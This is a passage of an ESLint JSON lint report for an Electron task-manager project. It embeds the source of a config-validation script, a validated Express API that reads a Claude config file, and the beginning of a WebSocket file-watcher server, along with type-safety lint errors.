execAsync(\n          `npx eslint --print-config \"${pattern.file}\"`, \n          { cwd: projectRoot }\n        );\n        const config = JSON.parse(stdout);\n        \n        patternResults[pattern.file] = {\n          expectedContext: pattern.expectedContext,\n          rules: Object.keys(config.rules || {}).length,\n          plugins: Object.keys(config.plugins || {}).length,\n          globals: Object.keys(config.languageOptions?.globals || {}).length,\n          parser: config.languageOptions?.parser?.name || 'default'\n        };\n\n        this.log(`âœ… ${pattern.file} -> ${patternResults[pattern.file].rules} rules`, 'green');\n      } catch (error) {\n        this.log(`âŒ ${pattern.file} -> Error: ${error.message}`, 'red');\n        patternResults[pattern.file] = { error: error.message };\n      }\n    }\n\n    this.results.validations.filePatterns = patternResults;\n  }\n\n  /**\n   * Validate specific Electron multi-process rules\n   */\n  validateElectronRules() {\n    this.log('\\nâš¡ Validating Electron Multi-Process Rules...', 'cyan');\n\n    const electronValidation = {\n      mainProcess: {\n        hasNodeGlobals: false,\n        allowsConsole: false,\n        hasFloatingPromiseCheck: false\n      },\n      preloadProcess: {\n        hasBothEnvironments: false,\n        strictContextBridge: false\n      },\n      rendererProcess: {\n        hasBrowserGlobals: false,\n        restrictsConsole: false,\n        hasReactRules: false\n      }\n    };\n\n    // Check main process rules\n    if (this.flatConfig.rules) {\n      electronValidation.mainProcess.allowsConsole = \n        this.flatConfig.rules['no-console'] === 'off';\n      electronValidation.mainProcess.hasFloatingPromiseCheck = \n        this.flatConfig.rules['@typescript-eslint/no-floating-promises'] === 'error';\n    }\n\n    // Check for browser/node globals (simplified check)\n    const globals = this.flatConfig.languageOptions?.globals || {};\n    electronValidation.rendererProcess.hasBrowserGlobals = \n      'window' in globals || 'document' in globals;\n\n    this.results.validations.electronRules = electronValidation;\n    \n    this.log('âœ… Electron multi-process validation completed', 'green');\n  }\n\n  /**\n   * Validate TypeScript integration\n   */\n  validateTypeScriptIntegration() {\n    this.log('\\nðŸ”· Validating TypeScript Integration...', 'cyan');\n\n    const tsValidation = {\n      hasTypeScriptParser: false,\n      hasTypeScriptPlugin: false,\n      hasProjectConfig: false,\n      hasRecommendedRules: false\n    };\n\n    // Check parser\n    tsValidation.hasTypeScriptParser = \n      this.flatConfig.languageOptions?.parser?.name?.includes('typescript') || false;\n\n    // Check plugins\n    const plugins = this.flatConfig.plugins || {};\n    tsValidation.hasTypeScriptPlugin = '@typescript-eslint' in plugins;\n\n    // Check project configuration\n    tsValidation.hasProjectConfig = \n      this.flatConfig.languageOptions?.parserOptions?.project !== undefined;\n\n    // Check for essential TypeScript rules\n    const rules = this.flatConfig.rules || {};\n    const essentialTsRules = [\n      '@typescript-eslint/no-explicit-any',\n      '@typescript-eslint/no-unused-vars'\n    ];\n    \n    tsValidation.hasRecommendedRules = essentialTsRules.every(rule => rule in rules);\n\n    this.results.validations.typeScript = tsValidation;\n\n    const score = Object.values(tsValidation).filter(Boolean).length;\n    this.log(`âœ… TypeScript integration score: ${score}/4`, score === 4 ? 'green' : 'yellow');\n  }\n\n  /**\n   * Generate comprehensive validation report\n   */\n  generateReport() {\n    this.log('\\nðŸ“Š Generating Validation Report...', 'cyan');\n\n    // Calculate summary scores\n    const validations = this.results.validations;\n    \n    if (validations.ruleParity) {\n      const parity = validations.ruleParity;\n      const totalLegacyRules = Object.keys(parity.matching).length + \n                              Object.keys(parity.different).length + \n                              Object.keys(parity.missing).length;\n      const matchingRatio = totalLegacyRules > 0 ? \n        (Object.keys(parity.matching).length / totalLegacyRules) * 100 : 100;\n      \n      this.results.summary.ruleParityScore = Math.round(matchingRatio);\n    }\n\n    this.results.summary.filePatternTests = validations.filePatterns ? \n      Object.keys(validations.filePatterns).length : 0;\n    \n    this.results.summary.electronValidation = validations.electronRules ? 'completed' : 'skipped';\n    this.results.summary.typeScriptValidation = validations.typeScript ? 'completed' : 'skipped';\n\n    // Generate recommendations\n    this.generateRecommendations();\n\n    // Write report to file\n    const reportPath = join(projectRoot, 'scripts/eslint-validation-report.json');\n    writeFileSync(reportPath, JSON.stringify(this.results, null, 2));\n\n    this.log(`\\nðŸ“„ Report saved to: ${reportPath}`, 'green');\n    this.displaySummary();\n  }\n\n  /**\n   * Generate actionable recommendations\n   */\n  generateRecommendations() {\n    const recommendations = [];\n\n    if (this.results.validations.ruleParity) {\n      const missing = Object.keys(this.results.validations.ruleParity.missing || {});\n      if (missing.length > 0) {\n        recommendations.push({\n          type: 'rule-parity',\n          severity: 'warning',\n          message: `${missing.length} rules from legacy config are missing in flat config`,\n          action: 'Review missing rules and add if necessary',\n          rules: missing\n        });\n      }\n    }\n\n    if (this.results.validations.typeScript?.hasProjectConfig === false) {\n      recommendations.push({\n        type: 'typescript',\n        severity: 'info',\n        message: 'TypeScript project configuration not detected in all contexts',\n        action: 'Consider adding project: true for enhanced type checking'\n      });\n    }\n\n    this.results.recommendations = recommendations;\n  }\n\n  /**\n   * Display validation summary\n   */\n  displaySummary() {\n    this.log('\\nðŸŽ¯ Validation Summary', 'bright');\n    this.log('='.repeat(50), 'blue');\n    \n    if (this.results.summary.ruleParityScore !== undefined) {\n      const score = this.results.summary.ruleParityScore;\n      const color = score >= 90 ? 'green' : score >= 75 ? 'yellow' : 'red';\n      this.log(`Rule Parity Score: ${score}%`, color);\n    }\n    \n    this.log(`File Pattern Tests: ${this.results.summary.filePatternTests}`, 'blue');\n    this.log(`Electron Validation: ${this.results.summary.electronValidation}`, 'blue');\n    this.log(`TypeScript Validation: ${this.results.summary.typeScriptValidation}`, 'blue');\n\n    if (this.results.recommendations.length > 0) {\n      this.log('\\nðŸ’¡ Recommendations:', 'yellow');\n      this.results.recommendations.forEach((rec, index) => {\n        this.log(`${index + 1}. [${rec.severity.toUpperCase()}] ${rec.message}`, 'yellow');\n        this.log(`   Action: ${rec.action}`, 'cyan');\n      });\n    } else {\n      this.log('\\nâœ… No recommendations - configuration looks excellent!', 'green');\n    }\n\n    this.log('\\nðŸš€ ESLint Flat Config Migration Validation Complete!', 'bright');\n  }\n\n  /**\n   * Run all validations\n   */\n  async runValidation() {\n    try {\n      this.log('ðŸŽ¯ ESLint Flat Config Validation (2025)', 'bright');\n      this.log('='.repeat(50), 'blue');\n\n      await this.loadConfigurations();\n      this.validateRuleParity();\n      await this.validateFilePatterns();\n      this.validateElectronRules();\n      this.validateTypeScriptIntegration();\n      this.generateReport();\n\n    } catch (error) {\n      this.log(`\\nðŸ’¥ Validation failed: ${error.message}`, 'red');\n      console.error(error);\n      process.exit(1);\n    }\n  }\n}\n\n// Run validation if script is executed directly\nif (import.meta.url === `file://${process.argv[1]}`) {\n  const validator = new ESLintConfigValidator();\n  validator.runValidation();\n}\n\nexport default ESLintConfigValidator;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/security-audit.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/security-baseline.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/unified-test-runner.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/validate-eslint-config.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/server/claude-config-api.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/server/claude-config-api.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":59,"column":46,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":59,"endColumn":54}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { Request, Response, Application } from 'express';\nimport { z } from 'zod';\nimport fs from 'fs/promises';\n// Removed unused import\nimport helmet from 'helmet';\nimport rateLimit from 'express-rate-limit';\n\n// Branded types for enhanced type safety\ndeclare const __brand: unique symbol;\ntype Brand<B> = { [__brand]: B };\nexport type Branded<T, B> = T & Brand<B>;\n\nexport type SafeFilePath = Branded<string, 'SafeFilePath'>;\nexport type ClaudeConfigData = Branded<object, 'ClaudeConfigData'>;\n\n// Validation schemas using Zod\nconst ConfigPathSchema = z.object({\n  configPath: z.string()\n    .min(1, 'Config path cannot be empty')\n    .max(500, 'Config path too long')\n    .refine(\n      (path) => {\n        // Allowlist validation: Only allow specific safe paths\n        const allowedPaths = [\n          '/Users/davidleathers/.claude.json',\n          // Add other explicitly allowed paths here\n        ];\n        return allowedPaths.some(allowedPath => path === allowedPath);\n      },\n      {\n        message: 'Access to this file path is not permitted'\n      }\n    )\n    .transform((path): SafeFilePath => path as SafeFilePath)\n});\n\nconst ConfigInfoQuerySchema = z.object({\n  path: z.string()\n    .optional()\n    .transform((path): SafeFilePath | undefined => \n      path ? ConfigPathSchema.parse({ configPath: path }).configPath : undefined\n    )\n});\n\n// Security middleware configuration\nconst claudeConfigRateLimit = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // Limit each IP to 100 requests per windowMs\n  message: {\n    error: 'Too many requests from this IP, please try again later.',\n    retryAfter: '15 minutes'\n  },\n  standardHeaders: true,\n  legacyHeaders: false,\n});\n\n// Generic validation middleware\nfunction validateRequest<T extends z.ZodTypeAny>(schema: T) {\n  return (req: Request, res: Response, next: Function): void => {\n    try {\n      const validatedData = schema.parse(req.body);\n      req.body = validatedData;\n      next();\n    } catch (error) {\n      if (error instanceof z.ZodError) {\n        const errorMessages = error.errors.map(issue => ({\n          field: issue.path.join('.'),\n          message: issue.message,\n        }));\n        \n        res.status(400).json({\n          error: 'Validation failed',\n          details: errorMessages\n        });\n        return;\n      }\n      \n      // Log the error for monitoring but don't expose details\n      console.error('Validation error:', error);\n      res.status(500).json({\n        error: 'Internal server error during validation'\n      });\n      return;\n    }\n  };\n}\n\n// Sanitize and validate file path\nfunction sanitizeFilePath(inputPath: string): SafeFilePath {\n  try {\n    const result = ConfigPathSchema.parse({ configPath: inputPath });\n    return result.configPath;\n  } catch {\n    throw new Error('Invalid or unauthorized file path');\n  }\n}\n\n// Secure file operations with proper error handling\nasync function readConfigFile(filePath: SafeFilePath): Promise<{\n  config: ClaudeConfigData;\n  stats: {\n    lastModified: string;\n    fileSize: string;\n    fileSizeBytes: number;\n  };\n}> {\n  try {\n    // Check if file exists and get stats\n    const stats = await fs.stat(filePath);\n    const fileSizeInBytes = stats.size;\n    const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);\n    \n    // Read file content with size limit (prevent DoS)\n    const maxFileSize = 10 * 1024 * 1024; // 10MB limit\n    if (fileSizeInBytes > maxFileSize) {\n      throw new Error('File size exceeds maximum allowed limit');\n    }\n    \n    const fileContent = await fs.readFile(filePath, 'utf8');\n    \n    // Parse JSON with error handling\n    let config: object;\n    try {\n      config = JSON.parse(fileContent);\n    } catch {\n      throw new Error('Invalid JSON format in configuration file');\n    }\n    \n    return {\n      config: config as ClaudeConfigData,\n      stats: {\n        lastModified: stats.mtime.toISOString(),\n        fileSize: `${fileSizeInMB} MB`,\n        fileSizeBytes: fileSizeInBytes\n      }\n    };\n  } catch (error) {\n    if (error instanceof Error) {\n      // Re-throw known errors\n      throw error;\n    }\n    // Handle unknown errors\n    throw new Error('Failed to read configuration file');\n  }\n}\n\n// Enhanced error response without information disclosure\nfunction sendErrorResponse(res: Response, statusCode: number, message: string, logError?: unknown) {\n  if (logError) {\n    console.error('API Error:', logError);\n  }\n  \n  res.status(statusCode).json({\n    error: message,\n    timestamp: new Date().toISOString()\n  });\n}\n\n// Add Claude config API endpoints to the existing Express app\nexport function addClaudeConfigAPI(app: Application): void {\n  // Apply security middleware\n  app.use('/api/claude-config', helmet({\n    contentSecurityPolicy: {\n      directives: {\n        defaultSrc: [\"'self'\"],\n        scriptSrc: [\"'self'\"],\n        styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n        imgSrc: [\"'self'\", \"data:\"],\n      },\n    },\n    hsts: {\n      maxAge: 31536000,\n      includeSubDomains: true,\n      preload: true\n    }\n  }));\n  \n  app.use('/api/claude-config', claudeConfigRateLimit);\n  \n  // POST /api/claude-config - Read Claude configuration with validation\n  app.post('/api/claude-config', \n    validateRequest(ConfigPathSchema),\n    async (req: Request, res: Response) => {\n      try {\n        const { configPath } = req.body;\n        const safeFilePath = sanitizeFilePath(configPath);\n        \n        const result = await readConfigFile(safeFilePath);\n        \n        res.json({\n          config: result.config,\n          lastModified: result.stats.lastModified,\n          fileSize: result.stats.fileSize,\n          fileSizeBytes: result.stats.fileSizeBytes,\n          success: true\n        });\n        \n      } catch (error) {\n        if (error instanceof Error) {\n          switch (error.message) {\n            case 'Invalid or unauthorized file path':\n              sendErrorResponse(res, 403, 'Access denied to specified file path', error);\n              break;\n            case 'File size exceeds maximum allowed limit':\n              sendErrorResponse(res, 413, 'File too large to process', error);\n              break;\n            case 'Invalid JSON format in configuration file':\n              sendErrorResponse(res, 400, 'Configuration file contains invalid JSON', error);\n              break;\n            default:\n              if (error.message.includes('ENOENT')) {\n                sendErrorResponse(res, 404, 'Configuration file not found', error);\n              } else if (error.message.includes('EACCES')) {\n                sendErrorResponse(res, 403, 'Permission denied accessing configuration file', error);\n              } else {\n                sendErrorResponse(res, 500, 'Failed to read configuration file', error);\n              }\n              break;\n          }\n        } else {\n          sendErrorResponse(res, 500, 'Internal server error', error);\n        }\n      }\n    }\n  );\n  \n  // GET /api/claude-config/info - Get file info without reading content\n  app.get('/api/claude-config/info', async (req: Request, res: Response): Promise<void> => {\n    try {\n      const queryValidation = ConfigInfoQuerySchema.parse(req.query);\n      const configPath = queryValidation.path || '/Users/davidleathers/.claude.json' as SafeFilePath;\n      const safeFilePath = sanitizeFilePath(configPath);\n      \n      const stats = await fs.stat(safeFilePath);\n      const fileSizeInBytes = stats.size;\n      const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);\n      \n      res.json({\n        path: safeFilePath,\n        lastModified: stats.mtime.toISOString(),\n        fileSize: `${fileSizeInMB} MB`,\n        fileSizeBytes: fileSizeInBytes,\n        exists: true,\n        success: true\n      });\n      \n    } catch (error) {\n      if (error instanceof z.ZodError) {\n        const errorMessages = error.errors.map(issue => ({\n          field: issue.path.join('.'),\n          message: issue.message,\n        }));\n        \n        res.status(400).json({\n          error: 'Invalid query parameters',\n          details: errorMessages\n        });\n        return;\n      }\n      \n      if (error instanceof Error) {\n        if (error.message.includes('ENOENT')) {\n          sendErrorResponse(res, 404, 'Configuration file not found', error);\n        } else if (error.message.includes('EACCES')) {\n          sendErrorResponse(res, 403, 'Permission denied accessing configuration file', error);\n        } else if (error.message === 'Invalid or unauthorized file path') {\n          sendErrorResponse(res, 403, 'Access denied to specified file path', error);\n        } else {\n          sendErrorResponse(res, 500, 'Failed to get configuration file info', error);\n        }\n      } else {\n        sendErrorResponse(res, 500, 'Internal server error', error);\n      }\n    }\n  });\n  \n  // Health check endpoint\n  app.get('/api/claude-config/health', (req: Request, res: Response) => {\n    res.json({\n      status: 'healthy',\n      timestamp: new Date().toISOString(),\n      version: '2.0.0'\n    });\n  });\n}\n\nexport default addClaudeConfigAPI;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/server/discovery-engine.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/server/file-watcher.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/server/file-watcher.ts","messages":[{"ruleId":"@typescript-eslint/ban-ts-comment","severity":2,"message":"Use \"@ts-expect-error\" instead of \"@ts-ignore\", as \"@ts-ignore\" will do nothing if the following line is error-free.","line":12,"column":1,"nodeType":"Line","messageId":"tsIgnoreInsteadOfExpectError","endLine":12,"endColumn":60,"suggestions":[{"messageId":"replaceTsIgnoreWithTsExpectError","fix":{"range":[421,480],"text":"// @ts-expect-error - Module doesn't have TypeScript declarations"},"desc":"Replace \"@ts-ignore\" with \"@ts-expect-error\"."}]},{"ruleId":"@typescript-eslint/ban-ts-comment","severity":2,"message":"Use \"@ts-expect-error\" instead of \"@ts-ignore\", as \"@ts-ignore\" will do nothing if the following line is error-free.","line":14,"column":1,"nodeType":"Line","messageId":"tsIgnoreInsteadOfExpectError","endLine":14,"endColumn":62,"suggestions":[{"messageId":"replaceTsIgnoreWithTsExpectError","fix":{"range":[545,606],"text":"// @ts-expect-error - Module doesn't have TypeScript declarations  "},"desc":"Replace \"@ts-ignore\" with \"@ts-expect-error\"."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":32,"column":9,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":32,"endColumn":12,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1072,1075],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1072,1075],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":38,"column":14,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":38,"endColumn":17,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1216,1219],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1216,1219],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":39,"column":14,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":39,"endColumn":17,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1234,1237],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1234,1237],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":190,"column":47,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":190,"endColumn":50,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5548,5551],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5548,5551],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":243,"column":51,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":243,"endColumn":54,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6959,6962],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6959,6962],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":470,"column":43,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":470,"endColumn":46,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[12925,12928],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[12925,12928],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":490,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":490,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13479,13482],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13479,13482],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":507,"column":22,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":507,"endColumn":25,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[13990,13993],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[13990,13993],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":569,"column":61,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":569,"endColumn":64,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[15807,15810],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[15807,15810],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":640,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":640,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[17807,17810],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[17807,17810],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":12,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import express, { Request, Response, NextFunction } from 'express';\nimport { watch, FSWatcher } from 'fs';\nimport { readFile, access } from 'fs/promises';\nimport path from 'path';\nimport cors from 'cors';\nimport { WebSocketServer, WebSocket } from 'ws';\nimport { createServer } from 'http';\nimport helmet from 'helmet';\nimport rateLimit from 'express-rate-limit';\nimport { z } from 'zod';\nimport log from 'electron-log';\n// @ts-ignore - Module doesn't have TypeScript declarations\nimport { ProjectDiscoveryEngine } from './discovery-engine.js';\n// @ts-ignore - Module doesn't have TypeScript declarations  \nimport { addClaudeConfigAPI } from './claude-config-api.js';\n\n// Configure server logging\nlog.transports.file.level = 'debug';\nlog.transports.console.level = 'debug';\nlog.transports.file.fileName = 'server.log';\nlog.transports.file.maxSize = 5 * 1024 * 1024; // 5MB\n\n// Override console for server logging\nObject.assign(console, log.functions);\n\n// Type definitions\ninterface Project {\n  id: string;\n  name: string;\n  path: string;\n  tasksFilePath: string;\n  data: any;\n  lastUpdated: string;\n}\n\ninterface DiscoveryProgress {\n  type: 'discoveryProgress' | 'discoveryComplete' | 'discoveryError';\n  progress?: any;\n  projects?: any[];\n  error?: string;\n}\n\n// Validation schemas\nconst ProjectSchema = z.object({\n  id: z.string()\n    .min(1, 'Project ID cannot be empty')\n    .max(100, 'Project ID too long')\n    .regex(/^[a-zA-Z0-9_-]+$/, 'Project ID contains invalid characters'),\n  name: z.string()\n    .min(1, 'Project name cannot be empty')\n    .max(200, 'Project name too long'),\n  path: z.string()\n    .min(1, 'Project path cannot be empty')\n    .refine((p) => {\n      // Prevent path traversal attacks\n      const normalizedPath = path.normalize(p);\n      return !normalizedPath.includes('..') && path.isAbsolute(normalizedPath);\n    }, 'Invalid project path - must be absolute and not contain parent directory references')\n});\n\nconst ProjectIdsSchema = z.object({\n  projectIds: z.array(z.string().regex(/^[a-zA-Z0-9_-]+$/))\n    .min(1, 'At least one project ID required')\n    .max(50, 'Too many project IDs')\n});\n\nconst DiscoveryOptionsSchema = z.object({\n  maxDepth: z.number().int().min(1).max(10).optional(),\n  excludePatterns: z.array(z.string()).optional(),\n  includePaths: z.array(z.string()).optional()\n}).optional();\n\n// Security middleware\nfunction validateInput<T>(schema: z.ZodSchema<T>) {\n  return (req: Request, res: Response, next: NextFunction): void => {\n    try {\n      schema.parse(req.body);\n      next();\n    } catch (error) {\n      if (error instanceof z.ZodError) {\n        res.status(400).json({\n          error: 'Validation failed',\n          details: error.errors.map(e => ({\n            field: e.path.join('.'),\n            message: e.message\n          }))\n        });\n      } else {\n        res.status(400).json({ error: 'Invalid request data' });\n      }\n    }\n  };\n}\n\nfunction sanitizeFilePath(filePath: string): string | null {\n  try {\n    const normalizedPath = path.normalize(filePath);\n    \n    // Prevent path traversal\n    if (normalizedPath.includes('..')) {\n      return null;\n    }\n    \n    // Ensure absolute path\n    if (!path.isAbsolute(normalizedPath)) {\n      return null;\n    }\n    \n    // Additional security: only allow specific file extensions\n    const allowedExtensions = ['.json'];\n    const ext = path.extname(normalizedPath);\n    if (!allowedExtensions.includes(ext)) {\n      return null;\n    }\n    \n    return normalizedPath;\n  } catch {\n    return null;\n  }\n}\n\n// Enhanced error handler\nfunction handleError(error: unknown, req: Request, res: Response): void {\n  console.error('Request error:', {\n    url: req.url,\n    method: req.method,\n    error: error instanceof Error ? error.message : 'Unknown error',\n    timestamp: new Date().toISOString()\n  });\n  \n  // Don't expose internal error details\n  res.status(500).json({\n    error: 'Internal server error',\n    timestamp: new Date().toISOString()\n  });\n}\n\n// Initialize Express app with security\nconst app = express();\nconst server = createServer(app);\n\n// Security headers\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      connectSrc: [\"'self'\", \"ws://localhost:*\", \"wss://localhost:*\"],\n      scriptSrc: [\"'self'\", \"'unsafe-inline'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", \"data:\", \"blob:\"],\n    },\n  },\n}));\n\n// Rate limiting\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // Limit each IP to 100 requests per windowMs\n  message: {\n    error: 'Too many requests from this IP, please try again later.',\n  },\n  standardHeaders: true,\n  legacyHeaders: false,\n});\napp.use(limiter);\n\n// CORS with specific origin (in production, replace with actual frontend URL)\nconst corsOptions = {\n  origin: process.env.NODE_ENV === 'production' \n    ? ['https://your-production-domain.com']\n    : ['http://localhost:3000', 'http://localhost:5173', 'http://localhost:4173'],\n  credentials: true,\n  optionsSuccessStatus: 200\n};\napp.use(cors(corsOptions));\n\n// Body parsing with size limits\napp.use(express.json({ limit: '10mb' }));\napp.use(express.urlencoded({ extended: true, limit: '10mb' }));\n\n// Request logging middleware\napp.use((req: Request, res: Response, next: NextFunction) => {\n  console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - IP: ${req.ip}`);\n  next();\n});\n\n// WebSocket server with enhanced security\nconst wss = new WebSocketServer({ \n  server,\n  verifyClient: (info: { origin: string; req: any }) => {\n    // Basic origin verification for WebSocket connections\n    const allowedOrigins = corsOptions.origin as string[];\n    const origin = info.origin;\n    \n    if (process.env.NODE_ENV === 'production') {\n      return allowedOrigins.includes(origin);\n    }\n    \n    return true; // Allow all origins in development\n  }\n});\n\n// Secure storage\nconst projects = new Map<string, Project>();\nconst fileWatchers = new Map<string, FSWatcher>();\nconst connections = new Set<WebSocket>();\n\n// Initialize discovery engine\nconst discoveryEngine = new ProjectDiscoveryEngine();\n\n// WebSocket connection handling\nwss.on('connection', (ws: WebSocket, req) => {\n  const clientIp = req.socket.remoteAddress;\n  console.log(`WebSocket client connected from ${clientIp}`);\n  \n  connections.add(ws);\n  \n  // Set up heartbeat to detect broken connections\n  const heartbeat = setInterval(() => {\n    if (ws.readyState === WebSocket.OPEN) {\n      ws.ping();\n    }\n  }, 30000);\n  \n  ws.on('pong', () => {\n    // Connection is alive\n  });\n  \n  ws.on('close', () => {\n    connections.delete(ws);\n    clearInterval(heartbeat);\n    console.log(`WebSocket client disconnected from ${clientIp}`);\n  });\n  \n  ws.on('error', (error) => {\n    console.error('WebSocket error:', error);\n    connections.delete(ws);\n    clearInterval(heartbeat);\n  });\n});\n\n// Secure broadcast function\nfunction broadcastUpdate(projectId: string, data: any): void {\n  const message = JSON.stringify({\n    type: 'fileUpdate',\n    projectId: projectId,\n    data: data,\n    timestamp: new Date().toISOString()\n  });\n  \n  connections.forEach(ws => {\n    if (ws.readyState === WebSocket.OPEN) {\n      try {\n        ws.send(message);\n      } catch (error) {\n        console.error('Error broadcasting to client:', error);\n        connections.delete(ws);\n      }\n    }\n  });\n}\n\n// Enhanced file watching with security\nfunction watchTasksFile(projectId: string, filePath: string): void {\n  // Validate file path\n  const sanitizedPath = sanitizeFilePath(filePath);\n  if (!sanitizedPath) {\n    throw new Error('Invalid file path');\n  }\n  \n  // Close existing watcher if any\n  if (fileWatchers.has(projectId)) {\n    fileWatchers.get(projectId)?.close();\n  }\n  \n  try {\n    const 